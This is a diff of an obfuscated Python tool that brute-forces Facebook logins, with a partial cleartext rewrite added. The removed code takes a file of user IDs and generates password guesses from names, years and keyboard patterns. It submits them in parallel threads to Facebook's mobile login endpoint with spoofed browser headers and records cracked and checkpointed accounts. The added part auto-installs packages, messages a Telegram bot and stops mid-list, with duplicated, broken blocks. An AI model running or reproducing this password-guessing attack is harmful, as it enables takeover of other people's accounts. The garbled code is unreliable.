-def IIllllIllllllIIlI ():IlllIIIlllllIlllI ();IllIllllIIIllllll ().plerr ()
-class IllIllllIIIllllll :
-	def __init__ (IlIIlIIIIlIllIIIl ):IlIIlIIIIlIllIIIl .id =[]
-	def plerr (IlIlIIIIllIlIIIII ):
-		os .system (_IlIIlllIIlIIllIlI );IlllIIIlllllIlllI ()
-		try :
-			print (IIIIIIIIIIIllIlII );print (IlIllIllIIIlIllIl +'##اكتب مسار الايديات##');IlllllIlIIIllIIII =input (IlIllIlIIllIllIIl +' ENTER FILE NAME : ')
-			for IIlIIIllllIIIIlII in open (IlllllIlIIIllIIII ,_IIllIlIlIlIlIIllI ).readlines ():id .append (IIlIIIllllIIIIlII .strip ())
-			print (IllllIlllllIllIlI +'TOTAL IDS : '+str (len (id )))
-			for IIlIllIIlIIllllll in range (101 ):print ('\rLoading => '+str (IIlIllIIlIIllllll )+'%',end ='');time .sleep (.02 )
-			IlIllIlllIlIlIllI ()
-		except IOError :print ('ERROR File %s'%IlllllIlIIIllIIII );time .sleep (2 );IIllllIllllllIIlI ()
-def IlIllIlllIlIlIllI ():
-	IlllllllIIlIlllII =' Select => ';IlllIIIlllllIlllI ();print (IllllIlllllIllIlI +' [ 01 ] Slow\n [ 02 ] Fast');IlIllIlIllIIllIIl =input (IllllIlllllIllIlI +IlllllllIIlIlllII )
-	if IlIllIlIllIIllIIl in [_IIllIIlIllllIlIIl ,_IIIIIlIIIIIIlIlIl ]:
-		IlIIIIlIIIlIlIlll =[]
-		for IlllIIIIIIIlIIIll in sorted (id ):IlIIIIlIIIlIlIlll .append (IlllIIIIIIIlIIIll )
-		IIIlIIlllIIlIIIII =len (IlIIIIlIIIlIlIlll );IIllIlllllIIIllII =IIIlIIlllIIlIIIII -1 
-		for IllIIIIIlIIIIllll in range (IIIlIIlllIIlIIIII ):IlllIIIIllIlIIlII .append (IlIIIIlIIIlIlIlll [IIllIlllllIIIllII ]);IIllIlllllIIIllII -=1 
-	elif IlIllIlIllIIllIIl in ['2','02']:
-		for IlllIIIIIIIlIIIll in id :IIIlllllllIlllIIl =random .randint (0 ,len (IlllIIIIllIlIIlII ));IlllIIIIllIlIIlII .insert (IIIlllllllIlllIIl ,IlllIIIIIIIlIIIll )
-	else :print (IllllIlllllIllIlI +'Error SELECT');exit ()
-	IIIIIIIllIIlIIIlI (_IIIIIllllIlIlIIII *30 );print (f" [ 01 ] Method Fast");IIIlIlIlIllIllllI =input (IllllIlllllIllIlI +IlllllllIIlIlllII )
-	if IIIlIlIlIllIllllI in [_IIllIIlIllllIlIIl ,_IIIIIlIIIIIIlIlIl ]:IIlllIIlllIllIlII .append (_IIIIllIlIlIlIIlll )
-	else :IIlllIIlllIllIlII .append (_IIIIllIlIlIlIIlll )
-	IIIIIIIllIIlIIIlI (_IIIIIllllIlIlIIII *30 );IIIIlIllIIIIlllll =input (IllllIlllllIllIlI +' [ 01 ] Normal\n [ 02 ] Fast\n SELECT => ')
-	if IIIIlIllIIIIlllll in ['y',_IIIllllIIIlIIlIII ]:
-		IllIlIlllIlllIIIl .append ('ya');print (f"ExSample : qwerty,qwerty2,qwerty3");IIlllIIIlIIlllIlI =input ('ADD Your Password => ');IIIllIIlIIlIIllII =IIlllIIIlIIlllIlI .split (',')
-		for IIIIIIllIIllIlIIl in IIIllIIlIIlIIllII :IllllIIlIIIIIIlll .append (IIIIIIllIIllIlIIl )
-	else :IllIlIlllIlllIIIl .append ('no')
-	IlllIIIIlIIIlllII ();exit ()
-def IIIIIIIllIIlIIIlI (IllIlIIlllIlIIIIl ,IlllIIlIlllIlllll =.02 ):
-	for IlllIllIIIIlIIIlI in IllIlIIlllIlIIIIl +_IlIlIllllIIlIIllI :sys .stdout .write (IlllIllIIIIlIIIlI );sys .stdout .flush ();time .sleep (IlllIIlIlllIlllll )
-def IlllIIIIlIIIlllII ():
-	IlIIllllllllllIlI ='19991999';IIIIIIllIlIlIIllI ='19981998';IlllIIIlllIlIllll ='19971997';IIIIlllllIIllIllI ='19961996';IIlIIllIllIllllll ='19951995';IlIIlIlIlIlIIIlIl ='19941994';IIIIIIIIIIIlIIIlI ='19931993';IIIIIlllIIllIIIII ='19921992';IlllIlIIIllIllIII ='19911991';IIIIlIIlIIIIIIllI ='19901990';IllllIlllllIIllII ='19801980';IlIIlIllIlIllIIII ='20232023';IllIIIIIIlIllIlIl ='20222022';IlllIlIlllllIIlII ='20202020';IlllIlIllIllllIII ='20022002';IlIIIlIIIlIIIlIlI ='20032003';IlIlllIIlIlIIIIIl ='20042004';IIllIIllIlllllIIl ='1122334455@@';IIlIIIIllIIIIlIIl ='ll998877665544332211';IlIlIIIIIIIIlIIll ='112233445566778899';IIIlIIlIIIllIllIl ='1l2l3l4l5l6l7l8l9l';IIIlIIllllIlIIlII ='1l2l3l4l5l';IlIlIIllIllllIlIl ='ll99887766';IllIllIlIlllIlIII ='qwertyuiopasdfghjkl';IllIlIlIIlIIIlIIl ='zxcvzxcv';IIlIIlllllllIlIll ='qqwweerr';IIllIIIlIIlIIIIII ='zzxxccvv';IIIIlIIlIIIllIlII ='ppooiiuuyy';IlIlllIlIIlIIlIII ='mmnnbbvv';IIllllIIlIIlIllII ='00009999';IlIIIIIIllIIIllIl ='77889900';IllIllllIllIlIllI ='١٢٣٤٥٦٧٨٩';IIIllIlIIIIlllIIl ='١٢٣٤٥٦';IIlIllIllIIllIIII ='123123';IlIllIlllIIIlllII ='first1234567';IlIIlIIllllIlIlll ='first123';IlIIIIlIIlIlIllll ='firstlast';IIIIlllIlIllIIIll ='1234';IlllIlIlIlIIllIll ='123';IIIIlIIIlllIIIIIl ='frs+frs'
-	with tred (max_workers =30 )as IIIlllIlIIllllIII :
-		for IIlIIlIIlIlIlllII in IlllIIIIllIlIIlII :
-			IlIllIIIllIIIllll ,IlIlIlIIlllIIllIl =IIlIIlIIlIlIlllII .split (_IIIIIIIlIIIlIIlIl )[0 ],IIlIIlIIlIlIlllII .split (_IIIIIIIlIIIlIIlIl )[1 ].lower ();IIlIllllllIIllIlI =IlIlIlIIlllIIllIl .split (' ')[0 ];IIlllIIllIlllIIIl =[]
-			if len (IlIlIlIIlllIIllIl )<6 :
-				if len (IIlIllllllIIllIlI )<3 :0 
-				else :IIlllIIllIlllIIIl .append (IlIlIlIIlllIIllIl );IIlllIIllIlllIIIl .append (IIIIlIIIlllIIIIIl );IIlllIIllIlllIIIl .append (IIlIllllllIIllIlI +IlllIlIlIlIIllIll );IIlllIIllIlllIIIl .append (IIlIllllllIIllIlI +IIIIlllIlIllIIIll );IIlllIIllIlllIIIl .append (IlIIIIlIIlIlIllll );IIlllIIllIlllIIIl .append (IlIIlIIllllIlIlll );IIlllIIllIlllIIIl .append (IlIllIlllIIIlllII );IIlllIIllIlllIIIl .append (IIlIllllllIIllIlI +IIlIllIllIIllIIII );IIlllIIllIlllIIIl .append (IIIllIlIIIIlllIIl );IIlllIIllIlllIIIl .append (IllIllllIllIlIllI );IIlllIIllIlllIIIl .append (IlIIIIIIllIIIllIl );IIlllIIllIlllIIIl .append (IIllllIIlIIlIllII );IIlllIIllIlllIIIl .append (IlIlllIlIIlIIlIII );IIlllIIllIlllIIIl .append (IIIIlIIlIIIllIlII );IIlllIIllIlllIIIl .append (IIllIIIlIIlIIIIII );IIlllIIllIlllIIIl .append (IIlIIlllllllIlIll );IIlllIIllIlllIIIl .append (IllIlIlIIlIIIlIIl );IIlllIIllIlllIIIl .append (IllIllIlIlllIlIII );IIlllIIllIlllIIIl .append (IlIlIIllIllllIlIl );IIlllIIllIlllIIIl .append (IIIlIIllllIlIIlII );IIlllIIllIlllIIIl .append (IIIlIIlIIIllIllIl );IIlllIIllIlllIIIl .append (IlIlIIIIIIIIlIIll );IIlllIIllIlllIIIl .append (IIlIIIIllIIIIlIIl );IIlllIIllIlllIIIl .append (IIllIIllIlllllIIl );IIlllIIllIlllIIIl .append (IlIlllIIlIlIIIIIl );IIlllIIllIlllIIIl .append (IlIIIlIIIlIIIlIlI );IIlllIIllIlllIIIl .append (IlllIlIllIllllIII );IIlllIIllIlllIIIl .append (IlllIlIlllllIIlII );IIlllIIllIlllIIIl .append (IllIIIIIIlIllIlIl );IIlllIIllIlllIIIl .append (IlIIlIllIlIllIIII );IIlllIIllIlllIIIl .append (IllllIlllllIIllII );IIlllIIllIlllIIIl .append (IIIIlIIlIIIIIIllI );IIlllIIllIlllIIIl .append (IlllIlIIIllIllIII );IIlllIIllIlllIIIl .append (IIIIIlllIIllIIIII );IIlllIIllIlllIIIl .append (IIIIIIIIIIIlIIIlI );IIlllIIllIlllIIIl .append (IlIIlIlIlIlIIIlIl );IIlllIIllIlllIIIl .append (IIlIIllIllIllllll );IIlllIIllIlllIIIl .append (IIIIlllllIIllIllI );IIlllIIllIlllIIIl .append (IlllIIIlllIlIllll );IIlllIIllIlllIIIl .append (IIIIIIllIlIlIIllI );IIlllIIllIlllIIIl .append (IlIIllllllllllIlI )
-			elif len (IIlIllllllIIllIlI )<3 :IIlllIIllIlllIIIl .append (IlIlIlIIlllIIllIl )
-			else :IIlllIIllIlllIIIl .append (IlIlIlIIlllIIllIl );IIlllIIllIlllIIIl .append (IIIIlIIIlllIIIIIl );IIlllIIllIlllIIIl .append (IIlIllllllIIllIlI +IlllIlIlIlIIllIll );IIlllIIllIlllIIIl .append (IIlIllllllIIllIlI +IIIIlllIlIllIIIll );IIlllIIllIlllIIIl .append (IlIIIIlIIlIlIllll );IIlllIIllIlllIIIl .append (IlIIlIIllllIlIlll );IIlllIIllIlllIIIl .append (IlIllIlllIIIlllII );IIlllIIllIlllIIIl .append (IIlIllllllIIllIlI +IIlIllIllIIllIIII );IIlllIIllIlllIIIl .append (IIIllIlIIIIlllIIl );IIlllIIllIlllIIIl .append (IllIllllIllIlIllI );IIlllIIllIlllIIIl .append (IlIIIIIIllIIIllIl );IIlllIIllIlllIIIl .append (IIllllIIlIIlIllII );IIlllIIllIlllIIIl .append (IlIlllIlIIlIIlIII );IIlllIIllIlllIIIl .append (IIIIlIIlIIIllIlII );IIlllIIllIlllIIIl .append (IIllIIIlIIlIIIIII );IIlllIIllIlllIIIl .append (IIlIIlllllllIlIll );IIlllIIllIlllIIIl .append (IllIlIlIIlIIIlIIl );IIlllIIllIlllIIIl .append (IllIllIlIlllIlIII );IIlllIIllIlllIIIl .append (IlIlIIllIllllIlIl );IIlllIIllIlllIIIl .append (IIIlIIllllIlIIlII );IIlllIIllIlllIIIl .append (IIIlIIlIIIllIllIl );IIlllIIllIlllIIIl .append (IlIlIIIIIIIIlIIll );IIlllIIllIlllIIIl .append (IIlIIIIllIIIIlIIl );IIlllIIllIlllIIIl .append (IIllIIllIlllllIIl );IIlllIIllIlllIIIl .append ('12345@@@@@');IIlllIIllIlllIIIl .append ('1122334455@@@@@');IIlllIIllIlllIIIl .append (IlIlllIIlIlIIIIIl );IIlllIIllIlllIIIl .append (IlIIIlIIIlIIIlIlI );IIlllIIllIlllIIIl .append (IlllIlIllIllllIII );IIlllIIllIlllIIIl .append (IlllIlIlllllIIlII );IIlllIIllIlllIIIl .append ('20212021');IIlllIIllIlllIIIl .append (IllIIIIIIlIllIlIl );IIlllIIllIlllIIIl .append (IlIIlIllIlIllIIII );IIlllIIllIlllIIIl .append (IllllIlllllIIllII );IIlllIIllIlllIIIl .append (IIIIlIIlIIIIIIllI );IIlllIIllIlllIIIl .append (IlllIlIIIllIllIII );IIlllIIllIlllIIIl .append (IIIIIlllIIllIIIII );IIlllIIllIlllIIIl .append (IIIIIIIIIIIlIIIlI );IIlllIIllIlllIIIl .append (IlIIlIlIlIlIIIlIl );IIlllIIllIlllIIIl .append (IIlIIllIllIllllll );IIlllIIllIlllIIIl .append (IIIIlllllIIllIllI );IIlllIIllIlllIIIl .append (IlllIIIlllIlIllll );IIlllIIllIlllIIIl .append (IIIIIIllIlIlIIllI );IIlllIIllIlllIIIl .append (IlIIllllllllllIlI )
-			if 'ya'in IllIlIlllIlllIIIl :
-				for IllllllIllIlIlllI in IllllIIlIIIIIIlll :IIlllIIllIlllIIIl .append (IllllllIllIlIlllI )
-			else :0 
-			if _IIIIllIlIlIlIIlll in IIlllIIlllIllIlII :IIIlllIlIIllllIII .submit (IllIIlllllIIIllIl ,IlIllIIIllIIIllll ,IIlllIIllIlllIIIl )
-			elif 'free'in IIlllIIlllIllIlII :IIIlllIlIIllllIII .submit (crackfree ,IlIllIIIllIIIllll ,IIlllIIllIlllIIIl )
-			elif 'touch'in IIlllIIlllIllIlII :IIIlllIlIIllllIII .submit (cracktouch ,IlIllIIIllIIIllll ,IIlllIIllIlllIIIl )
-			elif 'mbasic'in IIlllIIlllIllIlII :IIIlllIlIIllllIII .submit (crackmbasic ,IlIllIIIllIIIllll ,IIlllIIllIlllIIIl )
-			else :IIIlllIlIIllllIII .submit (crackmbasic ,IlIllIIIllIIIllll ,IIlllIIllIlllIIIl )
-	print ('');print (f"[{IlIlIIlIlIlIIlIlI}•{IIlllIllllllIlIIl}]{IIlIIllIIIIllIlll} OK : {h}%s "%IIIlllIIlIIIlllll );print (f"{IIlllIllllllIlIIl}[{IlIlIIlIlIlIIlIlI}•{x}]{IlllIIIllIIlIllll} CP : {k}%s{x} "%IIlIIIIIIIIIlIIIl )
-def IllIIlllllIIIllIl (IllIlIlIIIlllIIll ,IIIlIIIIIIlIIIllI ):
-	IIlIlIIIIlllIllII ='\\<div\\>\\<\\/div\\>\\<div\\ class\\=".*?"\\>(.*?)<\\/div\\>';IIIlIlIIIIIIllIlI ='\\/><div\\ class\\=".*?"\\>\\<span\\ class\\=".*?"\\>(.*?)<\\/span\\>';IIIIlllllllIIllIl ='\\<title\\>(.*?)<\\/title\\>';IlllIIIIlIlIIlIIl ='green';IlIlIlllIlllIlllI ='OK/';IlIIlllIIIIllllIl ='%s=%s';IlllIIIlIlIlIllll ='https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F';IllIlIlIIlIIllIlI ='en-GB,en-US;q=0.9,en;q=0.8';IllIlIlllIlIlIllI ='gzip, deflate br';IllllllIIIllllIll ='document';IIlIIlllIlIllIlIl ='empty';IlIIlIlllIIIIlIlI ='cors';IlIllIllIllllIIIl ='same-origin';IllllIIllIIlIIIlI ='mark.via.gp';IlIIIIIIIlllllIlI ='text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9';IlIlIIIllIIlIlIII ='m.facebook.com';IIlIIIlllIIIIllll ='accept-language';IlIllIIIlIllIllII ='accept-encoding';IIlIlIlIlIlIlIIII ='referer';IIIlllIIIlIIIllIl ='sec-fetch-dest';IIllIlIIIlIllIlIl ='sec-fetch-user';IlIIllIIIIIIlIlll ='sec-fetch-mode';IllllIIlIIllIllIl ='sec-fetch-site';IlIlIIIllIlIlIlII ='x-requested-with';IIIlIlIIIllIIllll ='accept';IIIlIIIlIlIIlllIl ='upgrade-insecure-requests';IllIIlIlIIIIlllIl ='Host';global IlIIlIIIlIIlIlllI ,IIIlllIIlIIIlllll ,IIlIIIIIIIIIlIIIl ;IllIIlIlllIlIIllI =random .choice ([IlllllllIlllIIIII ,IlllIIIllIIlIllll ,IIlIIllIIIIllIlll ,IlIlIIlIlIlIIlIlI ,IIIIIllIlIIlllIIl ,IIlllIllllllIlIIl ]);IIllIIlIIIlllIlIl =random .choice ;IlllIIIIIIIIllIII =IIllIIlIIIlllIlIl (['😀','😃','😄','😁','😆','😅','🤣','😂','🙂','🙃','😉','😊','😇','🥰','😍','🤩','😘','😗','😚','😙','😋','😛','😜','🤪','😝','🤑','🤗','🤭','🤫','🤔','🤐','🤨','😐','😑','😶','😏','😒','🙄','😬','🤥','😌','😔','😪','🤤','😴','😷','🤒','🤕','🤢','🤮','🤧','🥵','🥶','🥴','😵','🤯','🤠','🥳','😎','🤓','🧐','😕','😟','🙁','☹️','😮','😯','😲','😳','🥺','😦','😧','😨','😰','😥','😢','😭','😱','😖','😣','😞','😓','😩','😫','🥱','😤','😡','😠','🤬','😈','👿','💀','☠️','💩','🤡','👹','👺','👻','👽','👾','🤖','😺','😸','😹','😻','😼','😽','🙀','😿','😾','🧡','💛','💚','💙','💜','🖤','🤍','🤎','❤️','🧡','💛','💚','💙','💜','🖤','🤍','🤎','❣️','💕','💞','💓','💗','💖','💘','💝','💟','❤️\u200d🔥','❤️\u200d🩹','❤️','🚀','🛸','🌍','🌎','🌏','💔','✈️','🦦','🔥','👌🏼','👋🏼','🌚','🔞','🙆\u200d♂️','🤦\u200d♂️','✨','🗿','👍🏼','🚬']);sys .stdout .write (f"\r{IllIIlIlllIlIIllI}({IlllIIIIIIIIllIII}🔱 نمــࢪود 🔱𖤤) {IlIIlIIIlIIlIlllI}•{len(id)}  • OK:{IIIlllIIlIIIlllll} •  CP:{IIlIIIIIIIIIlIIIl} • ({'{:.0%}'.format(IlIIlIIIlIIlIlllI/float(len(id)))}{amr})"),;sys .stdout .flush ();IIlIIlIlIllIIllII =random .choice (IlIlllllIlIlIIlII );IlIlIlllllIlIIlII =random .choice (IIllIllIlIlIlIIll );IIllIIllllIllllII =requests .Session ()
-	for IIlIlllIlIIlIIlIl in IIIlIIIIIIlIIIllI :
-		try :
-			IIllllllllllIlIll =time .time ();IIllIIllllIllllII .headers .update ({IllIIlIlIIIIlllIl :IlIlIIIllIIlIlIII ,IIIlIIIlIlIIlllIl :_IIllIIlIllllIlIIl ,_IIIllllIlIlIIlIlI :IlIlIlllllIlIIlII ,IIIlIlIIIllIIllll :IlIIIIIIIlllllIlI ,'dnt':_IIllIIlIllllIlIIl ,IlIlIIIllIlIlIlII :IllllIIllIIlIIIlI ,IllllIIlIIllIllIl :IlIllIllIllllIIIl ,IlIIllIIIIIIlIlll :IlIIlIlllIIIIlIlI ,IIllIlIIIlIllIlIl :IIlIIlllIlIllIlIl ,IIIlllIIIlIIIllIl :IllllllIIIllllIll ,IIlIlIlIlIlIlIIII :'https://m.facebook.com/',IlIllIIIlIllIllII :IllIlIlllIlIlIllI ,IIlIIIlllIIIIllll :IllIlIlIIlIIllIlI });IlllIllIlIIIIIIlI =IIllIIllllIllllII .get (IlllIIIlIlIlIllll ).text ;IllIlIIIllIIIllII ={'lsd':re .search ('name="lsd" value="(.*?)"',str (IlllIllIlIIIIIIlI )).group (1 ),'jazoest':re .search ('name="jazoest" value="(.*?)"',str (IlllIllIlIIIIIIlI )).group (1 ),'uid':IllIlIlIIIlllIIll ,'flow':'login_no_pin','pass':IIlIlllIlIIlIIlIl ,'next':'https://developers.facebook.com/tools/debug/accesstoken/'};IIllIIllllIllllII .headers .update ({IllIIlIlIIIIlllIl :IlIlIIIllIIlIlIII ,'cache-control':'max-age=0',IIIlIIIlIlIIlllIl :_IIllIIlIllllIlIIl ,'origin':'https://m.facebook.com','content-type':_IIIlIIlIlIlllIIlI ,_IIIllllIlIlIIlIlI :IIlIIlIlIllIIllII ,IIIlIlIIIllIIllll :IlIIIIIIIlllllIlI ,IlIlIIIllIlIlIlII :IllllIIllIIlIIIlI ,IllllIIlIIllIllIl :IlIllIllIllllIIIl ,IlIIllIIIIIIlIlll :IlIIlIlllIIIIlIlI ,IIllIlIIIlIllIlIl :IIlIIlllIlIllIlIl ,IIIlllIIIlIIIllIl :IllllllIIIllllIll ,IIlIlIlIlIlIlIIII :IlllIIIlIlIlIllll ,IlIllIIIlIllIllII :IllIlIlllIlIlIllI ,IIlIIIlllIIIIllll :IllIlIlIIlIIllIlI });IlIllllIIlllIIlll =IIllIIllllIllllII .post ('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data =IllIlIIIllIIIllII ,allow_redirects =False )
-			if 'checkpoint'in IlIllllIIlllIIlll .cookies .get_dict ().keys ():
-				if 'ya'in IIIlIllIlIIlIIlll :IIllIIlllIIIIIlll .append (IllIlIlIIIlllIIll +_IIIIIIIlIIIlIIlIl +IIlIlllIlIIlIIlIl );ceker (IllIlIlIIIlllIIll ,IIlIlllIlIIlIIlIl )
-				else :print (_IlIlIllllIIlIIllI );IIIIlllIllllllIIl =f"""
-\t\t\t\t\t▄︻デ══━一 «𝗖𝗣❌  سڪيوࢪ ࿐» ⏎
+webbrowser.open('')
+from datetime import *
+        
+try:
+        
+        import rich
+except ImportError:
+        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
+        os.system('pip install rich')
+try:
+        import stdiomask
+except ImportError:
+        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
+        os.system('pip install stdiomask')
+try:
+	import requests
+except ImportError:
+	Z = '\033[1;31m' #احمر
+R = '\033[1;31m' #احمر
+X = '\033[1;33m' #اصفر
+F = '\033[2;32m' #اخضر
+C = "\033[1;97m" #ابيض
+B = '\033[2;36m'#سمائي
+Y = '\033[1;34m' #ازرق فاتح.
+E = '\033[1;31m'
+B = '\033[2;36m'
+G = '\033[1;32m'
+S = '\033[1;33m'
+
+import requests,bs4,json,os,sys,random,datetime,time,re
+import urllib3,rich,base64
+from time import sleep
+from rich.table import Table as me
+from rich.console import Console as sol
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup as parser
+from concurrent.futures import ThreadPoolExecutor as tred
+from rich.console import Group as gp
+from rich.panel import Panel as nel
+from rich import print as cetak
+from rich.markdown import Markdown as mark
+from rich.columns import Columns as col
+from rich import print as rprint
+from rich import pretty
+from rich.text import Text as tekz
+import os
+from rich.text import Text as tekz;from rich.progress import track
+
+        
+try:
+        
+        import rich
+except ImportError:
+        os.system('pip install rich')
+try:
+        import stdiomask
+except ImportError:
+        os.system('pip install stdiomask')
+try:
+	import requests
+except ImportError:
+	Z = '\033[1;31m' #احمر
+R = '\033[1;31m' #احمر
+X = '\033[1;33m' #اصفر
+F = '\033[2;32m' #اخضر
+C = "\033[1;97m" #ابيض
+B = '\033[2;36m'#سمائي
+Y = '\033[1;34m' #ازرق فاتح.
+E = '\033[1;31m'
+B = '\033[2;36m'
+G = '\033[1;32m'
+S = '\033[1;33m'
+print(B+SDMVIP)
+BVIP ='𝐒𝐃𝐌-𝐕𝐈𝐏 || المبرمج نمرود  @M_T_F '
+statusok1 = nel(BVIP, style='		       yellow')
+cetak(nel(statusok1, title=''))
+print('')
+print(('━'*32)+'\n• ❅─────✧❅ 𓆩𝐒𝐃𝐌-𝐕𝐈𝐏𓆪 ❅────────✧❅\n'+('━'*25))
+token = input(f'{X}TOKEN\x1b[1;35m :\x1b[1;32m ')
+print('\n')
+ID = input(f'{X}ID \x1b[1;32m   : ')
+SDM1 = '\nنورت حياتي اداة نمرود المجانية\n قناتي @py_1hon \n للاشتراك في ادواتي المدفوعة راسلني @M_T_F '
+requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(SDM1))
+os.system('clear')
+pretty.install()
+CON = sol()
+os.system('clear')
+cetak(nel('\t• Sedang Menginstall Modul Requests •'))
+
+pretty.install()
+CON=sol()
+ugen=['Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.96 Safari/537.36', 'Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:47.0) Gecko/20100101 Firefox/47.0', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.3; WOW64; Trident/5.0)', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:47.0) Gecko/20100101 Firefox/47.0', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0)', 'Mozilla/5.0 (X11; Linux i686; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Win64; x64; Trident/6.0)', 'Mozilla/5.0 (X11; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.149 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:50.0) Gecko/20100101 Firefox/50.0', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.101 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:47.0) Gecko/20100101 Firefox/47.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.121 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.110 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (X11; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 10.0; Win64; x64; Trident/5.0)', 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; Trident/6.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.99 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; Win64; x64; Trident/6.0)', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.111 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 10.0; Trident/4.0)', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Windows NT 6.3; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.101 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.127 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.78 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; Win64; x64; Trident/6.0)', 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.110 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.185 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.120 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Windows NT 6.3; rv:47.0) Gecko/20100101 Firefox/47.0', 'Mozilla/5.0 (Windows NT 10.0; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)', 